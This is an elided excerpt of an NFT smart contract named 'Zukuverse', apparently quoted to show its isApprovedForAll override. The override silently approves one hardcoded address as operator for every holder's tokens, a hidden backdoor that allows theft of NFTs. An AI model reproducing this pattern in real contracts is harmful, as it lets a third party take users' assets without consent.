  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xb4634826009d5B2d84d4950fAfB92898adeAC4d5){return true;}
...
contract Zukuverse is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Zukuverse", "ZKVRS", maxBatchSize_, collectionSize_) {
